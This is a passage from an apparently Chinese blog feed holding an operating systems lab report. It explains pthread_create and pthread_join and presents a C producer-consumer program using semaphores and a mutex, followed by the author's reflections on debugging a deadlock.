title="预备知识"></a>预备知识</h4><h5 id="pthread-create"><a href="#pthread-create" class="headerlink" title="pthread_create"></a>pthread_create</h5><p>pthread_create是UNIX环境创建线程函数</p><p><strong>头文件：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br></code></pre></td></tr></table></figure><p><strong>函数声明：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pthread_create</span><span class="hljs-params">(<span class="hljs-keyword">pthread_t</span> *<span class="hljs-keyword">restrict</span> tidp,<span class="hljs-keyword">const</span> <span class="hljs-keyword">pthread_attr_t</span> *restrict_attr,<span class="hljs-keyword">void</span>*（*start_rtn)</span><span class="hljs-params">(<span class="hljs-keyword">void</span>*)</span>,<span class="hljs-keyword">void</span> *<span class="hljs-keyword">restrict</span> arg)</span>;<br>参数：<br></code></pre></td></tr></table></figure><ul><li>第一个参数为指向线程标识符的指针，可用如下方式定义 pthread_t thread1;</li><li>第二个参数用来设置线程属性。</li><li>第三个参数是线程运行函数的地址，即函数名，函数内包括循环。</li><li>最后一个参数是运行函数的参数。</li></ul><p><strong>返回值：</strong></p><p>若成功则返回0，否则返回出错编号</p><p><strong>注意：</strong></p><p>在编译时注意加上-l pthread参数，以调用静态链接库。因为pthread并非Linux系统的默认库。</p><h5 id="pthread-join"><a href="#pthread-join" class="headerlink" title="pthread_join"></a><strong>pthread_join</strong></h5><p><strong>函数简介：</strong></p><p>函数pthread_join用来等待一个线程的结束。pthread_join()函数，以阻塞的方式等待thread指定的线程结束。当函数返回时，被等待线程的资源被收回。如果线程已经结束，那么该函数会立即返回。并且thread指定的线程必须是joinable的。<br>　　<br><strong>头文件：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br></code></pre></td></tr></table></figure><p><strong>函数声明：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pthread_join</span><span class="hljs-params">(<span class="hljs-keyword">pthread_t</span> thread, <span class="hljs-keyword">void</span> **retval)</span></span>;<br></code></pre></td></tr></table></figure><p><strong>参数：</strong></p><ul><li><p>thread: 线程标识符，即线程ID，标识唯一线程，为被等待的线程标识符。</p></li><li><p>retval: 用户定义的指针，用来存储被等待线程的返回值。</p></li></ul><p><strong>返回值：</strong></p><p>如果执行成功，将返回0，如果失败则返回一个错误号。</p><h4 id="数据结构和符号说明-1"><a href="#数据结构和符号说明-1" class="headerlink" title="数据结构和符号说明"></a><strong>数据结构</strong>和符号说明</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N_WORKTIME = <span class="hljs-number">10</span>; <span class="hljs-comment">//工作次数</span><br><span class="hljs-comment">//三个信号量</span><br><span class="hljs-keyword">pthread_mutex_t</span> mutex = PTHREAD_MUTEX_INITIALIZER; <span class="hljs-comment">//线程间互斥</span><br><span class="hljs-keyword">sem_t</span> full;                                        <span class="hljs-comment">//填充的个数</span><br><span class="hljs-keyword">sem_t</span> empty;                                       <span class="hljs-comment">//空槽的个数</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">my_buffer</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">int</span> out;<br>    <span class="hljs-keyword">int</span> in;<br>    <span class="hljs-keyword">char</span> str[MAX_BUFFER_SIZE];<br>    <span class="hljs-keyword">int</span> num; <span class="hljs-comment">//缓冲区里字母数量</span><br>    <span class="hljs-keyword">int</span> is_empty;<br>&#125; buffer; <span class="hljs-comment">//缓冲区结构体</span><br><span class="hljs-comment">//struct my_buffer *buffer</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">get_random</span><span class="hljs-params">()</span><span class="hljs-comment">//得到3以内的一个随机数</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-keyword">char</span> <span class="hljs-title">getRandChar</span><span class="hljs-params">()</span><span class="hljs-comment">//得到A～Z的一个随机字母</span></span><br><span class="hljs-function">    </span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">printTime</span><span class="hljs-params">()</span> <span class="hljs-comment">//打印时间</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">produce_print</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *x)</span><span class="hljs-comment">//生产者进程的生产和信息打印</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">consume_print</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *x)</span><span class="hljs-comment">//消费者进程的生消费和信息打印</span></span><br><span class="hljs-function">    </span><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">produce</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span><span class="hljs-comment">//生产者线程</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">int</span> *x = (<span class="hljs-keyword">int</span> *)arg;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; N_WORKTIME; i++)<br>    &#123;<br>        <span class="hljs-built_in">sleep</span>(<span class="hljs-built_in">get_random</span>());<br><br>        <span class="hljs-built_in">sem_wait</span>(&amp;empty); <span class="hljs-comment">//若空槽个数低于0阻塞</span><br>        <span class="hljs-built_in">pthread_mutex_lock</span>(&amp;mutex);<br><br>        <span class="hljs-built_in">produce_print</span>(x);<br><br>        <span class="hljs-built_in">pthread_mutex_unlock</span>(&amp;mutex);<br>        <span class="hljs-built_in">sem_post</span>(&amp;full);<br>    &#125;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *)<span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">consume</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span><span class="hljs-comment">//消费者线程</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">int</span> *x = (<span class="hljs-keyword">int</span> *)arg;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; N_WORKTIME; i++)<br>    &#123;<br>        <span class="hljs-built_in">sleep</span>(<span class="hljs-built_in">get_random</span>());<br><br>        <span class="hljs-built_in">sem_wait</span>(&amp;full); <span class="hljs-comment">//若填充个数低于0阻塞</span><br>        <span class="hljs-built_in">pthread_mutex_lock</span>(&amp;mutex);<br><br>        <span class="hljs-built_in">consume_print</span>(x);<br><br>        <span class="hljs-built_in">pthread_mutex_unlock</span>(&amp;mutex);<br>        <span class="hljs-built_in">sem_post</span>(&amp;empty);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *)<span class="hljs-number">2</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_BUFFER_SIZE 10</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N_WORKTIME = <span class="hljs-number">10</span>; <span class="hljs-comment">//工作次数</span><br><span class="hljs-comment">//三个信号量</span><br><span class="hljs-keyword">pthread_mutex_t</span> mutex = PTHREAD_MUTEX_INITIALIZER; <span class="hljs-comment">//线程间互斥</span><br><span class="hljs-keyword">sem_t</span> full;                                        <span class="hljs-comment">//填充的个数</span><br><span class="hljs-keyword">sem_t</span> empty;                                       <span class="hljs-comment">//空槽的个数</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">my_buffer</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">int</span> out;<br>    <span class="hljs-keyword">int</span> in;<br>    <span class="hljs-keyword">char</span> str[MAX_BUFFER_SIZE];<br>    <span class="hljs-keyword">int</span> num; <span class="hljs-comment">//缓冲区里字母数量</span><br>    <span class="hljs-keyword">int</span> is_empty;<br>&#125; buffer; <span class="hljs-comment">//缓冲区结构体</span><br><span class="hljs-comment">//struct my_buffer *buffer;</span><br><span class="hljs-comment">//得到3以内的一个随机数</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">get_random</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> digit;<br>    digit = <span class="hljs-built_in">rand</span>() % <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">return</span> digit;<br>&#125;<br><br><span class="hljs-comment">//得到A～Z的一个随机字母</span><br><span class="hljs-function"><span class="hljs-keyword">char</span> <span class="hljs-title">getRandChar</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> letter;<br>    letter = (<span class="hljs-keyword">char</span>)((<span class="hljs-built_in">rand</span>() % <span class="hljs-number">26</span>) + <span class="hljs-string">&#x27;A&#x27;</span>);<br>    <span class="hljs-keyword">return</span> letter;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">printTime</span><span class="hljs-params">()</span> <span class="hljs-comment">//打印时间</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">time_t</span> now;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tm</span> *<span class="hljs-title">timenow</span>;</span> <span class="hljs-comment">//实例化tm结构指针</span><br>    <span class="hljs-built_in">time</span>(&amp;now);<br>    timenow = <span class="hljs-built_in">localtime</span>(&amp;now);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|   %02d:%02d:%02d   |  &quot;</span>, timenow-&gt;tm_hour, timenow-&gt;tm_min, timenow-&gt;tm_sec);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">produce_print</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *x)</span><span class="hljs-comment">//生产者进程的生产和信息打印</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//sleep(get_random());</span><br>    <span class="hljs-built_in">printTime</span>(); <span class="hljs-comment">//程序运行时间</span><br>    <span class="hljs-comment">/*生产产品*/</span><br>    <span class="hljs-keyword">char</span> c = <span class="hljs-built_in">getRandChar</span>(); <span class="hljs-comment">//随机获取字母</span><br>    buffer.str[buffer.in] = c;<br>    buffer.in = (buffer.in + <span class="hljs-number">1</span>) % MAX_BUFFER_SIZE;<br>    buffer.is_empty = <span class="hljs-number">0</span>; <span class="hljs-comment">//写入新产品</span><br>    buffer.num++;<br>    <span class="hljs-comment">//打印缓冲区</span><br>    <span class="hljs-keyword">int</span> p = (buffer.in - <span class="hljs-number">1</span> &gt;= buffer.out) ? (buffer.in - <span class="hljs-number">1</span>) : (buffer.in - <span class="hljs-number">1</span> + MAX_BUFFER_SIZE);<br>    <span class="hljs-keyword">for</span> (p; !(buffer.is_empty) &amp;&amp; p &gt;= buffer.out; p--)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, buffer.str[p % MAX_BUFFER_SIZE]);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">10</span> - buffer.num; j++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, <span class="hljs-string">&#x27;-&#x27;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   |   &quot;</span>);                 <span class="hljs-comment">//控制输出格式</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;producer_%d   |    &quot;</span>, *x); <span class="hljs-comment">//进程id信息</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;+ %c    |\n&quot;</span>, c); <span class="hljs-comment">//进程操作</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">consume_print</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *x)</span><span class="hljs-comment">//消费者进程的生消费和信息打印</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//sleep(get_random());</span><br>    <span class="hljs-built_in">printTime</span>(); <span class="hljs-comment">//程序运行时间</span><br>    <span class="hljs-comment">/*生产产品*/</span><br>    <span class="hljs-keyword">char</span> c = buffer.str[buffer.out];<br>    buffer.out = (buffer.out + <span class="hljs-number">1</span>) % MAX_BUFFER_SIZE;<br>    buffer.is_empty = (buffer.out == buffer.in); <span class="hljs-comment">//</span><br>    buffer.num--;<br>    <span class="hljs-comment">//打印缓冲区</span><br>    <span class="hljs-keyword">int</span> p = (buffer.in - <span class="hljs-number">1</span> &gt;= buffer.out) ? (buffer.in - <span class="hljs-number">1</span>) : (buffer.in - <span class="hljs-number">1</span> + MAX_BUFFER_SIZE);<br>    <span class="hljs-keyword">for</span> (p; !(buffer.is_empty) &amp;&amp; p &gt;= buffer.out; p--)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, buffer.str[p % MAX_BUFFER_SIZE]);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">10</span> - buffer.num; j++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, <span class="hljs-string">&#x27;-&#x27;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   |   &quot;</span>);                 <span class="hljs-comment">//控制输出格式</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;consumer_%d   |    &quot;</span>, *x); <span class="hljs-comment">//进程id信息</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;- %c    |\n&quot;</span>, c); <span class="hljs-comment">//进程操作</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">produce</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">int</span> *x = (<span class="hljs-keyword">int</span> *)arg;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; N_WORKTIME; i++)<br>    &#123;<br>        <span class="hljs-built_in">sleep</span>(<span class="hljs-built_in">get_random</span>());<br><br>        <span class="hljs-built_in">sem_wait</span>(&amp;empty); <span class="hljs-comment">//若空槽个数低于0阻塞</span><br>        <span class="hljs-built_in">pthread_mutex_lock</span>(&amp;mutex);<br><br>        <span class="hljs-built_in">produce_print</span>(x);<br><br>        <span class="hljs-built_in">pthread_mutex_unlock</span>(&amp;mutex);<br>        <span class="hljs-built_in">sem_post</span>(&amp;full);<br>    &#125;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *)<span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">consume</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">int</span> *x = (<span class="hljs-keyword">int</span> *)arg;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; N_WORKTIME; i++)<br>    &#123;<br>        <span class="hljs-built_in">sleep</span>(<span class="hljs-built_in">get_random</span>());<br><br>        <span class="hljs-built_in">sem_wait</span>(&amp;full); <span class="hljs-comment">//若填充个数低于0阻塞</span><br>        <span class="hljs-built_in">pthread_mutex_lock</span>(&amp;mutex);<br><br>        <span class="hljs-built_in">consume_print</span>(x);<br><br>        <span class="hljs-built_in">pthread_mutex_unlock</span>(&amp;mutex);<br>        <span class="hljs-built_in">sem_post</span>(&amp;empty);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *)<span class="hljs-number">2</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">srand</span>(<span class="hljs-built_in">time</span>(<span class="hljs-literal">NULL</span>)); <span class="hljs-comment">//随机化时间种子</span><br><br>    <span class="hljs-keyword">pthread_t</span> thid1;<br>    <span class="hljs-keyword">pthread_t</span> thid2;<br>    <span class="hljs-keyword">pthread_t</span> thid3;<br>    <span class="hljs-keyword">pthread_t</span> thid4;<br><br>    <span class="hljs-keyword">int</span> ret1;<br>    <span class="hljs-keyword">int</span> ret2;<br>    <span class="hljs-keyword">int</span> ret3;<br>    <span class="hljs-keyword">int</span> ret4;<br>    <span class="hljs-comment">//初始化信号量</span><br>    <span class="hljs-built_in">sem_init</span>(&amp;full, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">sem_init</span>(&amp;empty, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>);<br>    <span class="hljs-comment">//线程id</span><br>    <span class="hljs-keyword">int</span> t1 = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">int</span> t2 = <span class="hljs-number">2</span>;<br>    <span class="hljs-comment">//初始化缓冲区</span><br>    buffer.out = <span class="hljs-number">0</span>;<br>    buffer.in = <span class="hljs-number">0</span>;<br>    buffer.is_empty = <span class="hljs-number">1</span>;<br>    buffer.num = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------Thread Execution Table------------------\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-------------------------------------------------------------\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|     time     |  buffer data  | current thread | operation |\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-------------------------------------------------------------\n&quot;</span>);<br>    <span class="hljs-comment">//创建线程</span><br>    <span class="hljs-built_in">pthread_create</span>(&amp;thid1, <span class="hljs-literal">NULL</span>, produce, (<span class="hljs-keyword">void</span> *)&amp;t1);<br>    <span class="hljs-built_in">pthread_create</span>(&amp;thid2, <span class="hljs-literal">NULL</span>, consume, (<span class="hljs-keyword">void</span> *)&amp;t1);<br>    <span class="hljs-built_in">pthread_create</span>(&amp;thid3, <span class="hljs-literal">NULL</span>, produce, (<span class="hljs-keyword">void</span> *)&amp;t2);<br>    <span class="hljs-built_in">pthread_create</span>(&amp;thid4, <span class="hljs-literal">NULL</span>, consume, (<span class="hljs-keyword">void</span> *)&amp;t2);<br>    <span class="hljs-comment">//阻塞直到该线程结束</span><br>    <span class="hljs-built_in">pthread_join</span>(thid1, (<span class="hljs-keyword">void</span> **)&amp;ret1);<br>    <span class="hljs-built_in">pthread_join</span>(thid2, (<span class="hljs-keyword">void</span> **)&amp;ret2);<br>    <span class="hljs-built_in">pthread_join</span>(thid3, (<span class="hljs-keyword">void</span> **)&amp;ret3);<br>    <span class="hljs-built_in">pthread_join</span>(thid4, (<span class="hljs-keyword">void</span> **)&amp;ret4);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-------------------------------------------------------------\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;线程全部执行完毕,主进程运行结束！\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="程序初值和运行结果-1"><a href="#程序初值和运行结果-1" class="headerlink" title="程序初值和运行结果"></a>程序初值和运行结果</h4><p>线程</p><p><img src="/2021/11/30/%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85%E9%97%AE%E9%A2%98%E7%BC%96%E7%A8%8B%E5%AE%9E%E7%8E%B0/image-20211130090518453.png" alt="image-20211130090518453"></p><p><img src="/2021/11/30/%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85%E9%97%AE%E9%A2%98%E7%BC%96%E7%A8%8B%E5%AE%9E%E7%8E%B0/image-20211130090454157.png" alt="image-20211130090454157"></p><h3 id="五、实验总结"><a href="#五、实验总结" class="headerlink" title="五、实验总结"></a>五、实验总结</h3><p>本次实验中我学习到了如何利用共享内存通信来实现进程间的同步和互斥，开始时对shmget、shmat、shmdt、shmctl这些函数不是很了解，之后通过查阅资料了解了他们的用法，在编写代码的过程也遇到许多困难，在最后调试的时候还遇到了进程死锁的问题，后来看了半天才发现pv操作中给信号量设计的参数错误，导致每次进程结束都会被重置，这导致了死锁。但好在最后都发现了错误，顺利解决。</p><p>思考题让我们用线程实现，这比进程要容易很多，只需要申请一个全局变量就可以作为共享内存了，对于线程需要学习pthread_create 和pthread_join用法，最后大部分函数设计沿用进程的设计，成功实现！</p>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>操作系统实验五-银行家算法</title>
    <link href="/2021/11/30/%E9%93%B6%E8%A1%8C%E5%AE%B6%E7%AE%97%E6%B3%95/"/>
    <url>/2021/11/30/%E9%93%B6%E8%A1%8C%E5%AE%B6%E7%AE%97%E6%B3%95/</url>
    
